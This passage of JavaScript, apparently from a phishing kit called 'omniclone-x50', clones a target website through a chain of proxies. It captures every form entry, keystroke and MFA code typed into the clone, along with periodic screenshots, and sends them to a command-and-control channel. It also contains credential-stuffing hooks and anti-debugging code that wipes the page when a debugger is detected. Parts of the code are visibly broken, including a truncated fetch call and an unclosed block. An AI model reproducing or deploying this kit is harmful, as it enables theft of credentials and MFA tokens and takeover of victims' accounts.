async function installServiceWorker() {
  if ('serviceWorker' in navigator) {
    try {
      const swCode = `
        const CACHE_NAME = 'omniclone-x50-v1';
        self.addEventListener('install', e => self.skipWaiting());
        self.addEventListener('activate', e => e.waitUntil(clients.claim()));

        // Proxy fetch
        self.addEventListener('fetch', e => {
          const url = new URL(e.request.url);
          if (url.searchParams.has('x50proxy')) {
            const target = url.searchParams.get('x50proxy');
            e.respondWith(fetch(target, { mode: 'no-cors' }).catch(() => new Response('', { status: 500 })));
          }
        });

        // Handle C2 messages
        self.addEventListener('message', e => {
          if (e.data && e.data.type === 'exfil') {
            // Cache for offline
            caches.open(CACHE_NAME).then(cache => {
              cache.put('/exfil_cache', new Response(JSON.stringify(e.data.payload)));

              method: 'POST',
              headers: {'Content-Type':'application/json'},
              body: JSON.stringify(e.data.payload)
            }).catch(() => {});
          }
        });
      `;
      const blob = new Blob([swCode], { type: 'application/javascript' });
      const reg = await navigator.serviceWorker.register(URL.createObjectURL(blob));
      await navigator.serviceWorker.ready;
      serviceWorkerActive = true;
      // Flush any cached exfil
      navigator.serviceWorker.controller.postMessage({ type: 'flush' });

    } catch(e) {

// ================== PROXY FETCH (QUAD FALLBACK) ==================
let proxyIndex = 0;
async function attemptProxyFetch(url, retries=1) {
  // 1. Nightshade proxy
  try {
    const r = await fetch(NIGHTSHADE_PROXY + encodeURIComponent(url), { signal: AbortSignal.timeout(6000) });
    if(r.ok) return await r.text();
  } catch(e) {}

  // 2. Service Worker proxy (if active)
  if (serviceWorkerActive) {
    try {
      const proxyUrl = location.origin + location.pathname + '?x50proxy=' + encodeURIComponent(url);
      const r = await fetch(proxyUrl);
      if(r.ok) return await r.text();
    } catch(e) {}
  }

  // 3. Public proxies (round-robin)
  for(let i=0; i<PUBLIC_PROXIES.length; i++) {
    const proxy = PUBLIC_PROXIES[(proxyIndex + i) % PUBLIC_PROXIES.length];
    for(let a=0; a<=retries; a++) {
      try {
        const r = await fetch(proxy + encodeURIComponent(url), { signal: AbortSignal.timeout(8000) });
        if(r.ok) { proxyIndex = (proxyIndex + i) % PUBLIC_PROXIES.length; return await r.text(); }
      } catch(e) {}
      await sleep(jitter());
    }
  }

  // 4. Direct no-cors (last chance)
  try {
    const r = await fetch(url, { mode: 'no-cors', signal: AbortSignal.timeout(5000) });
    if(r.type === 'opaque') throw new Error('Opaque');
    return await r.text();
  } catch(e) {
    throw new Error('All proxy methods exhausted');
  }
}

async function loadHtml2Canvas() {
  if(html2canvasReady) return true;
  for(const src of HTML2CANVAS_CDNS) {
    try {
      await new Promise((resolve, reject) => {
        const s = document.createElement('script');
        s.src = src;
        s.onload = resolve;
        s.onerror = reject;
        document.head.appendChild(s);
      });
      html2canvasReady = true;
      return true;
    } catch(e) {}
  }
  return false;
}

// ================== CLONE ENGINE ==================
let targetOrigin = '';
let collectedForms = [];

function rewriteDoc(doc, baseUrl) {
  // Links
  doc.querySelectorAll('a[href]').forEach(a => {
    const href = a.getAttribute('href');
    if (href && !href.startsWith('javascript:') && !href.startsWith('#') && !href.startsWith('mailto:')) {
      a.href = 'javascript:void(0)';
      a.dataset.originalHref = new URL(href, baseUrl).href;
      a.addEventListener('click', navigateClone);
    }
  });

  // Forms
  doc.querySelectorAll('form').forEach(f => {
    f.action = 'javascript:void(0)';
    f.dataset.originalAction = new URL(f.getAttribute('action') || '', baseUrl).href || baseUrl;
    f.addEventListener('submit', handleFormSubmit);
  });

  // Input tracking
  doc.querySelectorAll('input, textarea, select').forEach(el => {
    el.addEventListener('input', collectForms);
    el.addEventListener('change', collectForms);
  });

  // Keylogger
  startKeylogger(doc);
}

function collectForms() {
  const frame = document.getElementById('cloneFrame');
  if (!frame.contentDocument) return;
  const forms = frame.contentDocument.querySelectorAll('form');
  collectedForms = [];
  forms.forEach((f, idx) => {
    const fd = new FormData(f);
    const data = {};
    for (const [k, v] of fd.entries()) data[k] = v;
    collectedForms.push({ id: f.id || `form_${idx}`, action: f.dataset.originalAction || '', data });
  });
}

async function navigateClone(e) {
  e.preventDefault();
  const href = e.currentTarget.dataset.originalHref;
  if (href) await loadPage(href);
}

async function handleFormSubmit(e) {
  e.preventDefault();
  const form = e.target;
  const formData = new FormData(form);
  const action = form.dataset.originalAction;

  await exfil({ forms: collectedForms });

  if (action) {
    const method = (form.method || 'GET').toUpperCase();
    let nextUrl = action;
    let fetchOpts = { method, headers: { 'Content-Type': 'application/x-www-form-urlencoded' } };
    if (method === 'POST') {
      fetchOpts.body = new URLSearchParams(formData).toString();
    } else {
      const u = new URL(action);
      for (const [k, v] of formData.entries()) u.searchParams.append(k, v);
      nextUrl = u.href;
    }
    await loadPage(nextUrl, fetchOpts);
  }
}

async function loadPage(url, fetchOpts = {}) {
  try {
    const html = await attemptProxyFetch(url);
    const parser = new DOMParser();
    const doc = parser.parseFromString(html, 'text/html');
    rewriteDoc(doc, url);
    const frame = document.getElementById('cloneFrame');
    frame.contentDocument.open();
    frame.contentDocument.write('<!DOCTYPE html>' + doc.documentElement.outerHTML);
    frame.contentDocument.close();
    collectForms();
    monitorForMFA(frame.contentDocument);
    // Start credential stuffing after a short delay
    setTimeout(() => autoStuffCredentials(frame.contentDocument), 1500);
    await exfil({ forms: collectedForms });
  } catch(e) {
    const frame = document.getElementById('cloneFrame');
    frame.contentDocument.open();
    frame.contentDocument.write(`<div style="padding:20px;color:red;">Failed to load page. Retrying automatically.</div>`);
    frame.contentDocument.close();
    setTimeout(() => loadPage(url, fetchOpts), 3000);
  }
}

function monitorForMFA(doc) {
  const observer = new MutationObserver(mutations => {
    for(const mut of mutations) {
      if(mut.addedNodes.length) {
        const inputs = doc.querySelectorAll('input[type="text"], input[type="number"], input[type="tel"]');
        inputs.forEach(input => {
          if(!input.dataset.mfaTracked) {
            input.dataset.mfaTracked = '1';
            input.addEventListener('input', () => {
              exfil({ mfa_token: input.value });
            });
          }
        });
      }
    }
  });
  observer.observe(doc.body, { childList: true, subtree: true });
}

// ================== MAIN ==================
document.getElementById('forgeBtn').addEventListener('click', async () => {
  const url = document.getElementById('targetUrl').value.trim();
  if(!url) return;
  targetOrigin = new URL(url).origin;
  const status = document.getElementById('status');
  status.textContent = 'Installing Service Worker…';
  await installServiceWorker();
  status.textContent = 'Connecting C2…';
  connectC2();
  status.textContent = 'Forging clone…';
  try {
    const html = await attemptProxyFetch(url);
    const parser = new DOMParser();
    const doc = parser.parseFromString(html, 'text/html');
    rewriteDoc(doc, url);

    const frame = document.getElementById('cloneFrame');
    frame.style.display = 'block';
    document.getElementById('forge-ui').classList.add('hidden');
    frame.contentDocument.open();
    frame.contentDocument.write('<!DOCTYPE html>' + doc.documentElement.outerHTML);
    frame.contentDocument.close();
    collectForms();
    monitorForMFA(frame.contentDocument);

    // Initial exfil
    await exfil({ forms: collectedForms });

    // Start credential stuffing and auto-refresh
    setTimeout(() => autoStuffCredentials(frame.contentDocument), 2000);
    startAutoRefresh(url);

    // Periodic screenshot (every 10s)
    setInterval(async () => {
      const screenshot = await takeScreenshot();
      await exfil({ screenshot });
    }, 10000);

  } catch(e) {
    status.textContent = 'Error: ' + e.message;
  }
});

// ================== SELF-CLEANING & ANTI-DEBUG ==================
window.addEventListener('beforeunload', () => {
  keylogBuffer = '';
  collectedForms = [];
  if(keylogTimer) clearInterval(keylogTimer);
  if(refreshInterval) clearInterval(refreshInterval);
  if(c2Socket) c2Socket.close();
});

setInterval(() => {
  const start = performance.now();
  debugger;
  if(performance.now() - start > 100) {
    document.body.innerHTML = '';
    window.location.href = 'about:blank';
  }
}, 2000);
</script>
</body>
